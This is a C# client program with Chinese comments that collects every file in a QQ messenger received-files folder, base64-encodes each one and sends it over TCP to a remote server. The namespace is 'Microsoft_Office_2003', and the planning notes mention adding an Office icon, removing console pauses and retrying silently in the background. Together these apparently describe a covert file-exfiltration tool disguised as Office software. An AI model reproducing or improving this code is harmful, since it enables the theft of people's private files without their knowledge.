/*
 * 当前程序只能同步一个文件夹
 * 
 * 还有一些问题：
 * 改成直接传二进制得了
 * md5检验错误
 * 
 * 未来思路：
 * 这是同步一个文件夹下内容的，未来程序先遍历请求文件夹，放进一个list，
 * 然后对比出没有的list值，进行文件检索，如果最后修改时间在30分钟以前，则可以传输
 * 传输时开启socket，默认不报socket异常和io异常
 * 传输时socket异常在外部，出现异常关闭socket，10分钟后再试一次
 * 
 * 服务器记录log，连接ip端口，当前时间，文件的路径QQ
 * 删除所有readkey
 * 最后补充一个office图标
 * 
 * 原则：
 * 传递时间短一点，单线程以免服务器出现传输错误
 * 最后修改时间短的不去碰
 * 大于限定大小的文件丢弃处理
 *
*/

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

//尝试封包同服务端进行通信，失败
//struct FilePack{
//    public char[] name;
//    public int fileNameSize;
//    public Int64 filesize;
//    public char[] md5;
//};
//本结构体可有可无
struct FilePack
{
    public string name;
    public string filesize;
    public string md5;
};
namespace Microsoft_Office_2003
{
    class Program
    {
        //对文件进行64位编码，其实没必要，还是TCP连接时序不同步的问题，主要根据主机带宽调整sleep时间
        static void File_Encode64(string file)
        {
            FileStream filestream = new FileStream(file, FileMode.Open);
            string base64Str;
            byte[] bt = new byte[filestream.Length];

            //调用read读取方法  
            filestream.Read(bt, 0, bt.Length);
            base64Str = Convert.ToBase64String(bt);
            filestream.Close();

            //将Base64串写入临时文本文件  
            FileStream fs = new FileStream(file + ".txt", FileMode.Create);
            //删除临时编码文件
            //File.Delete(tempPath);
            byte[] data = System.Text.Encoding.Default.GetBytes(base64Str);
            //开始写入  
            fs.Write(data, 0, data.Length);
            //清空缓冲区、关闭流  
            fs.Flush();
            fs.Close();
        }
        //获取MD5校验，不知为何我的校验总是不对，看看这个问题
        public static string GetMD5HashFromFile(string fileName)
        {
            try
            {
                FileStream file = new FileStream(fileName, FileMode.Open);
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(file);
                file.Close();

                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < retVal.Length; i++)
                {
                    sb.Append(retVal[i].ToString("x2"));
                }
                return sb.ToString();
            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5HashFromFile() fail,error:" + ex.Message);
            }
        }
        //单个结构体转换byte数组,本来是封包传输的，发现传输错误，猜测可能是时序不同步或者封包问题
        public static byte[] StructToBytes(object structObj)
        {
            //得到结构体的大小
            int size = Marshal.SizeOf(structObj);
            //创建byte数组
            byte[] _bytes = new byte[size];
            //分配结构体大小的内存空间
            IntPtr structPtr = Marshal.AllocHGlobal(size);
            //将结构体拷到分配好的内存空间
            Marshal.StructureToPtr(structObj, structPtr, false);
            //从内存空间拷到byte数组
            Marshal.Copy(structPtr, _bytes, 0, size);
            //释放内存空间
            Marshal.FreeHGlobal(structPtr);
            //返回byte数组
            return _bytes;
        }
        //发送文件信息和内容
        static void SendFileInfo(string file,Socket clientSocket,Thread th)
        {
            FilePack pack = new FilePack();
            //本来想着用char[]传递呢，后来直接stringtochararray
            //pack.name = new char[128];
            //pack.md5 = new char[32];

            //此处读文件的文件名
            System.IO.FileInfo file_Info0 = new System.IO.FileInfo(file);
            pack.name = file_Info0.Name;


            //此处的大小是要传输的经过编码文件的大小
            System.IO.FileInfo file_Info = new System.IO.FileInfo(file + ".txt");
            pack.filesize=file_Info.Length.ToString();
            Int64 file_size = file_Info.Length;

            //读取编码文本文件md5
            pack.md5 = GetMD5HashFromFile(file+".txt");
            //string sendMessage = "Message";

            //编码发送字节流
            //clientSocket.Send(Encoding.ASCII.GetBytes(sendMessage));
            
            Console.WriteLine(pack.name);
            
            
            //确定文件信息
            char[] name=new char[128];
            char[] size = new char[8];
            char[] md5 = new char[32];
            name=pack.name.ToCharArray();
            size = pack.filesize.ToString().ToCharArray();
            md5 =pack.md5.ToCharArray();

            //发送文件信息
            Thread.Sleep(1000);
            clientSocket.Send(Encoding.ASCII.GetBytes(name));
            Console.WriteLine(pack.filesize);
            Thread.Sleep(300);
            clientSocket.Send(Encoding.ASCII.GetBytes(size));
            Thread.Sleep(300);
            Console.WriteLine(pack.md5);
            clientSocket.Send(Encoding.ASCII.GetBytes(md5));
            Thread.Sleep(300);


            //发送文件
            //Console.WriteLine("prepaire sending:" + file+".txt");
            Int64 sent_size = 0;
            Int64 remained_size;
            Int64 send_size;
            //读文件读二进制流
            FileStream fs = new FileStream(file+".txt", FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            while (sent_size < file_size)
            {
                //Console.WriteLine(sent_size);
                remained_size = file_size - sent_size;
                if (remained_size > 1024)
                    send_size = 1024;
                else
                    send_size = remained_size;
                //将读到的数据变成字节发送。其实没必要，发送二进制流就好了，改一下下面的读字节流
                byte[] bs = br.ReadBytes((int)send_size);

                clientSocket.Send(bs);
                sent_size += send_size;

                //显示发送进度用，可以删除
                Console.WriteLine(sent_size);
                Thread.Sleep(50);
            }
            //发送完成
            Console.WriteLine("file send over");
            fs.Flush();
            fs.Close();
            //发送完毕，删除发送的编码文件
            File.Delete(file + ".txt");

        }
        static void Main(string[] args)
        {
            Thread th = Thread.CurrentThread;

            //初始化获得文件夹下所有文件
            string folderFullName = "C:/Users/WuHaoze/Documents/Tencent Files/3348253586/FileRecv/";
            string fileName = "";
            List<string> all_file = new List<string>();
            DirectoryInfo TheFolder = new DirectoryInfo(folderFullName);
            //遍历文件夹下所有文件路径
            foreach (FileInfo NextFile in TheFolder.GetFiles())
            {
                fileName = NextFile.Name;
                all_file.Add(folderFullName+fileName);
            }
            //TCP连接初始化
            IPAddress ip = IPAddress.Parse("xxx.xxx.xxx.xxx");
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            //尝试连接
            try
            {
                clientSocket.Connect(new IPEndPoint(ip, 9527)); //配置服务器IP与端口  
                Console.WriteLine("连接服务器成功");
                try
                {
                    foreach (string file in all_file)
                    {
                        System.IO.FileInfo file_Info = new System.IO.FileInfo(file);
                        fileName = file_Info.Name;
                        Console.WriteLine("准备转换文件" + fileName);
                        File_Encode64(folderFullName + fileName);
                        SendFileInfo(file, clientSocket, th);
                    }
                }
                catch
                {
                    clientSocket.Shutdown(SocketShutdown.Both);
                    clientSocket.Close();
                    return;
                }
            }
            catch
            {
                Console.WriteLine("连接服务器失败");
                Console.ReadKey();
                return;
            }
            Console.ReadKey();
        }
        
    }
}
